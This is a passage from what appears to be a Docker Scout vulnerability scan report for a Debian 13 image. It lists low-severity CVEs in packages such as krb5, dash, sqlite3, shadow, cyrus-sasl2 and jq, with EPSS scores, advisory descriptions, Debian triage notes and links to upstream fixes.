<a href="https://scout.docker.com/v/CVE-2024-26458?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.822%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

---
- krb5 1.22.1-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098754; unimportant)
https://github.com/LuMingYinDetect/krb5_defects/blob/main/krb5_detect_1.md
Fixed by: https://github.com/krb5/krb5/commit/c5f9c816107f70139de11b38aa02db2f1774ee0d (krb5-1.22-beta1)
Unused codepath, negligible security impact
https://mailman.mit.edu/pipermail/kerberos/2024-March/023095.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-5709?s=debian&n=krb5&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--5709" src="https://img.shields.io/badge/CVE--2018--5709-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in MIT Kerberos 5 (aka krb5) through 1.16. There is a variable "dbentry->n_key_data" in kadmin/dbutil/dump.c that can store 16-bit data but unknowingly the developer has assigned a "u4" variable to it, which is for 32-bit data. An attacker can use this vulnerability to affect other artifacts of the database as we know that a Kerberos database dump file contains trusted data.

---
- krb5 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889684)
https://github.com/poojamnit/Kerberos-V5-1.16-Vulnerabilities/tree/master/Integer%20Overflow
non-issue, codepath is only run on trusted input, potential integer
overflow is non-issue

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>dash</strong> <code>0.5.12-12</code> (deb)</summary>

<small><code>pkg:deb/debian/dash@0.5.12-12?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-102474?s=debian&n=dash&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--102474" src="https://img.shields.io/badge/CVE--2026--102474-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.150%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in dash. The printf builtin reserves four bytes before converting a Unicode \u or \U escape, but the multi-byte token can need five or six bytes. A local user who can supply such an escape to dash printf or echo %b, including through dash -c and a positional argument, can write one or two bytes past that reservation.

---
- dash <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2543004
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102473?s=debian&n=dash&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--102473" src="https://img.shields.io/badge/CVE--2026--102473-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.136%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in dash. When built without libc fnmatch, the internal pmatch() matcher implements * by unbounded recursion over candidate positions. A local user who can plant filenames, or otherwise feed that matcher, can make a short multi-star pattern such as *.*.*.*.*.tar.gz consume excessive CPU.

---
- dash <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1149887; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2543005
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>libsqlite3-0</strong> <code>3.46.1-7+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/libsqlite3-0@3.46.1-7%2Bdeb13u2?arch=amd64&distro=debian-13.8&upstream=sqlite3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-70873?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--70873" src="https://img.shields.io/badge/CVE--2025--70873-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.618%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An information disclosure issue in the zipfileInflate function in the zipfile extension in SQLite v3.51.1 and earlier allows attackers to obtain heap memory via supplying a crafted ZIP file.

---
- sqlite3 <unfixed> (unimportant)
https://sqlite.org/src/info/3d459f1fb1bd1b5e
https://sqlite.org/forum/forumpost/761eac3c82
https://gist.github.com/cnwangjihe/f496393f30f5ecec5b18c8f5ab072054
zipfile extension not build for Debian binary package builds

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-45346?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2021--45346" src="https://img.shields.io/badge/CVE--2021--45346-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.584%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Memory Leak vulnerability exists in SQLite Project SQLite3 3.35.1 and 3.37.0 via maliciously crafted SQL Queries (made via editing the Database File), it is possible to query a record, and leak subsequent bytes of memory that extend beyond the record, which could let a malicious user obtain sensitive information. NOTE: The developer disputes this as a vulnerability stating that If you give SQLite a corrupted database file and submit a query against the database, it might read parts of the database that you did not intend or expect.

---
- sqlite3 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005974)
- sqlite <removed> (unimportant)
https://github.com/guyinatuxedo/sqlite3_record_leaking
https://bugzilla.redhat.com/show_bug.cgi?id=2054793
https://sqlite.org/forum/forumpost/056d557c2f8c452ed5bb9c215414c802b215ce437be82be047726e521342161e
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>passwd</strong> <code>1:4.17.4-2</code> (deb)</summary>

<small><code>pkg:deb/debian/passwd@1%3A4.17.4-2?arch=amd64&distro=debian-13.8&upstream=shadow</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.942%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-135901?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=13&vr=%3C1%3A4.17.4-2%2Bdeb13u1"><img alt="unspecified : CVE--2026--135901" src="https://img.shields.io/badge/CVE--2026--135901-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1:4.17.4-2+deb13u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.17.4-2+deb13u1</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- shadow 1:4.20.4-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1154946)
https://www.openwall.com/lists/oss-security/2026/11/22/12
https://gist.github.com/DicksonWu654/cdad661068d6a50da475aac57a9f07f2
Fixed by: https://github.com/shadow-maint/shadow/commit/1112ed7e741d4db15272d0fee910a5c3360c3457 (4.20.4)
Fixed by: https://github.com/shadow-maint/shadow/commit/ce55bdb26c42939b4c71068f92d83efe72bd64e4 (4.20.4)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>login.defs</strong> <code>1:4.17.4-2</code> (deb)</summary>

<small><code>pkg:deb/debian/login.defs@1%3A4.17.4-2?arch=all&distro=debian-13.8&upstream=shadow</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.942%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-135901?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=13&vr=%3C1%3A4.17.4-2%2Bdeb13u1"><img alt="unspecified : CVE--2026--135901" src="https://img.shields.io/badge/CVE--2026--135901-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code>&lt;1:4.17.4-2+deb13u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:4.17.4-2+deb13u1</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- shadow 1:4.20.4-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1154946)
https://www.openwall.com/lists/oss-security/2026/11/22/12
https://gist.github.com/DicksonWu654/cdad661068d6a50da475aac57a9f07f2
Fixed by: https://github.com/shadow-maint/shadow/commit/1112ed7e741d4db15272d0fee910a5c3360c3457 (4.20.4)
Fixed by: https://github.com/shadow-maint/shadow/commit/ce55bdb26c42939b4c71068f92d83efe72bd64e4 (4.20.4)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libsmartcols1</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libsmartcols1@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libssl3t64</strong> <code>3.5.9-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libssl3t64@3.5.9-1~deb13u1?arch=amd64&distro=debian-13.8&upstream=openssl</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D3.2.1-3"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.2.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.541%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libsasl2-modules-db</strong> <code>2.1.28+dfsg1-9</code> (deb)</summary>

<small><code>pkg:deb/debian/libsasl2-modules-db@2.1.28%2Bdfsg1-9?arch=amd64&distro=debian-13.8&upstream=cyrus-sasl2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-129483?s=debian&n=cyrus-sasl2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--129483" src="https://img.shields.io/badge/CVE--2026--129483-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.696%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Cyrus SASL through 2.1.28 contains an authentication bypass vulnerability in the SRP server mechanism because srp_server_mech_step2 does not reject client public values A that are multiples of N. Unauthenticated network clients can send A equal to N to force a zero shared secret, authenticating as any existing user without the password and learning session keys.

---
- cyrus-sasl2 <unfixed> (unimportant)
https://www.openwall.com/lists/oss-security/2026/10/09/20
https://github.com/cyrusimap/cyrus-sasl/issues/896
https://gist.github.com/afldl/18d15d3f5a1df99411e35000c7de80db
Fixed by: https://github.com/cyrusimap/cyrus-sasl/commit/fb3724f43dc50247ff2bf02135457d6d77031654
cyrus-sasl2 in Debian builds with --disable-srp

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>login</strong> <code>1:4.16.0-2+really2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/login@1%3A4.16.0-2%2Breally2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux%402.41.5-0%2Bdeb13u1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>diffutils</strong> <code>1:3.10-4</code> (deb)</summary>

<small><code>pkg:deb/debian/diffutils@1%3A3.10-4?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-53910?s=debian&n=diffutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--53910" src="https://img.shields.io/badge/CVE--2026--53910-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

diff3 tool from GNU diffutils is vulnerable to a heap‑based buffer overflow due to multiple signed integer overflows in line‑mapping calculations. Incorrect arithmetic in mapping line ranges can result in corrupted values being used for memory allocation and loop bounds. When processing crafted diff output, these overflows may cause the application to allocate insufficient memory and subsequently perform out‑of‑bounds writes during internal processing.  An attacker who can control the output of the diff program used by diff3 (e.g. via --diff-program pointing to a malicious script) can trigger out-of-bounds writes, resulting in a crash and potentially remote code execution depending on the environment.   This issue has been fixed in commit 9ff04d5b84743e331e80b589335a52c5480d1815   NOTE: The project maintainers claim that this is not a security issue. They state that the worst outcome this issue can cause is a crash of diff and that it cannot be used to escalate privileges.

---
- diffutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1142675; unimportant)
Fixed by: https://cgit.git.savannah.gnu.org/cgit/diffutils.git/commit/?id=73ed7ce85cc78effb94daf028c9af6b4e5252e50
Fixed by: https://cgit.git.savannah.gnu.org/cgit/diffutils.git/commit/?id=9ff04d5b84743e331e80b589335a52c5480d1815
Negligible security impact.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libjq1</strong> <code>1.7.1-6+deb13u4</code> (deb)</summary>

<small><code>pkg:deb/debian/libjq1@1.7.1-6%2Bdeb13u4?arch=amd64&distro=debian-13.8&upstream=jq</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-9403?s=debian&n=jq&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--9403" src="https://img.shields.io/badge/CVE--2025--9403-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.304%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in jqlang jq up to 1.6. Impacted is the function run_jq_tests of the file jq_test.c of the component JSON Parser. Executing manipulation can lead to reachable assertion. The attack requires local access. The exploit has been publicly disclosed and may be utilized. Other versions might be affected as well.

---
- jq <unfixed> (unimportant)
https://github.com/jqlang/jq/issues/3393
Assertion failure in testsuite, negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>apt</strong> <code>3.0.4</code> (deb)</summary>

<small><code>pkg:deb/debian/apt@3.0.4?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.191%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>jq</strong> <code>1.7.1-6+deb13u4</code> (deb)</summary>

<small><code>pkg:deb/debian/jq@1.7.1-6%2Bdeb13u4?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-9403?s=debian&n=jq&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--9403" src="https://img.shields.io/badge/CVE--2025--9403-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.304%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in jqlang jq up to 1.6. Impacted is the function run_jq_tests of the file jq_test.c of the component JSON Parser. Executing manipulation can lead to reachable assertion. The attack requires local access. The exploit has been publicly disclosed and may be utilized. Other versions might be affected as well.

---
- jq <unfixed> (unimportant)
https://github.com/jqlang/jq/issues/3393
Assertion failure in testsuite, negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libuuid1</strong> <code>2.41.5-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/libuuid1@2.41.5-0%2Bdeb13u1?arch=amd64&distro=debian-13.8&upstream=util-linux</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.400%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@<!-- -->ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openssl-provider-legacy</strong> <code>3.5.9-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/openssl-provider-legacy@3.5.9-1~deb13u1?arch=amd64&distro=debian-13.8&upstream=openssl</code></small><br/>
